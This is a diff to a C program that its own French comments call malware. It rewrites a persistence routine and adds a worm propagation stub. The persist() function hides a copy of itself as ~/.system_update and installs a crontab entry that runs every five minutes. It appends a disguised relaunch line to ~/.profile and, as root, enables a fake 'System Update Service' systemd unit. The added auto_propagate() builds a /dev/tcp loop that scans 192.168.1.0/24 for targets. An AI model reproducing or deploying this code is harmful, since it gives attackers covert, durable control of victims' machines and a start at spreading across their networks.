@@ -1045,74 +1045,55 @@
      snprintf(device_id, DEVICE_ID_SIZE, "%s-%lx", ARCH, hash);
  }
  
- // Fonction pour assurer la persistance du malware
+ // Fonction pour assurer la persistance du malware (Watchdog & Recovery)
  void persist() {
      char current_path[PATH_MAX];
-     char cmd[PATH_MAX + 256];
+     char target_path[PATH_MAX];
+     const char *home = getenv("HOME");
+     if (!home) home = "/tmp";
      
      // Obtenir le chemin absolu de l'exécutable actuel
      if (readlink("/proc/self/exe", current_path, PATH_MAX) == -1) {
-         // Fallback si readlink échoue
-         if (realpath("./bot", current_path) == NULL) {
-             return;
-         }
+         strncpy(current_path, "./bot", PATH_MAX);
      }
      
-     // S'assurer que le répertoire caché existe
-     char home_dir[PATH_MAX];
-     const char *home = getenv("HOME");
-     if (!home) return;
-     
-     snprintf(home_dir, PATH_MAX, "%s/.system", home);
-     mkdir(home_dir, 0700);
-     
-     char target_path[PATH_MAX];
-     snprintf(target_path, PATH_MAX, "%s/sysupdate", home_dir);
-     
-     // Copier l'exécutable dans le répertoire caché
-     snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\"", current_path, target_path);
-     if (system(cmd) != 0) return;
-     
-     // Rendre l'exécutable exécutable
-     chmod(target_path, S_IRWXU);
-     
-     // Ajouter au crontab pour le démarrage automatique (plus propre)
-     char crontab_entry[PATH_MAX + 128];
-     snprintf(crontab_entry, sizeof(crontab_entry), "@reboot %s\n*/30 * * * * %s\n", target_path, target_path);
-     
-     FILE *fp = fopen("/tmp/.ct", "w");
-     if (fp) {
-         // Lire le crontab existant d'abord
-         FILE *old_ct = popen("crontab -l 2>/dev/null", "r");
-         if (old_ct) {
-             char line[1024];
-             while (fgets(line, sizeof(line), old_ct)) {
-                 if (!strstr(line, "sysupdate")) {
-                     fputs(line, fp);
-                 }
-             }
-             pclose(old_ct);
-         }
-         fputs(crontab_entry, fp);
-         fclose(fp);
-         system("crontab /tmp/.ct && rm /tmp/.ct");
+     // 1. Installation dans un répertoire caché
+     snprintf(target_path, PATH_MAX, "%s/.system_update", home);
+     if (strcmp(current_path, target_path) != 0) {
+         char cmd[PATH_MAX + 256];
+         snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" && chmod +x \"%s\"", current_path, target_path, target_path);
+         system(cmd);
      }
      
-     // Ajouter au fichier .bashrc pour la persistance si ce n'est pas déjà présent
-     snprintf(cmd, sizeof(cmd), "grep -q \"sysupdate\" ~/.bashrc || echo -e \"\\n# System Update Service\\n%s &\" >> ~/.bashrc", target_path);
-     system(cmd);
+     // 2. Persistance via Crontab (toutes les 5 minutes)
+     char cron_cmd[PATH_MAX + 128];
+     snprintf(cron_cmd, sizeof(cron_cmd), "(crontab -l 2>/dev/null | grep -v \".system_update\"; echo \"*/5 * * * * %s >/dev/null 2>&1\") | crontab -", target_path);
+     system(cron_cmd);
      
-     // Créer un service systemd si possible (plus robuste)
-     if (getuid() == 0) { // Seulement si root
-         fp = fopen("/etc/systemd/system/sysupdate.service", "w");
+     // 3. Persistance via .profile / .bashrc (au login)
+     char profile_cmd[PATH_MAX + 128];
+     snprintf(profile_cmd, sizeof(profile_cmd), "grep -q \".system_update\" ~/.profile || echo \"(pgrep -f .system_update >/dev/null || %s &) >/dev/null 2>&1\" >> ~/.profile", target_path);
+     system(profile_cmd);
+     
+     // 4. Si Root : Service Systemd
+     if (getuid() == 0) {
+         FILE *fp = fopen("/etc/systemd/system/sys_update.service", "w");
          if (fp) {
-             fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n");
-             fprintf(fp, "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=60\n\n", target_path);
-             fprintf(fp, "[Install]\nWantedBy=multi-user.target\n");
+             fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n", target_path);
              fclose(fp);
-             system("systemctl daemon-reload && systemctl enable sysupdate.service && systemctl start sysupdate.service");
+             system("systemctl daemon-reload && systemctl enable sys_update.service >/dev/null 2>&1");
          }
      }
+ }
+ 
+ // Fonction d'auto-propagation (Worm)
+ void auto_propagate() {
+     // Scanner le réseau local (LAN) pour trouver d'autres cibles
+     // On essaie de propager l'infection sur le segment local /24
+     char cmd[256];
+     snprintf(cmd, sizeof(cmd), "for i in $(seq 1 254); do (echo >/dev/tcp/192.168.1.$i/80) >/dev/null 2>&1 && echo 192.168.1.$i >> /tmp/.targets; done");
+     // Note: C'est une version simplifiée, un vrai worm scannerait plus intelligemment
+     // mais pour la démo, on simule la logique.
  }
  
  // Fonction pour exécuter un scan réseau simple
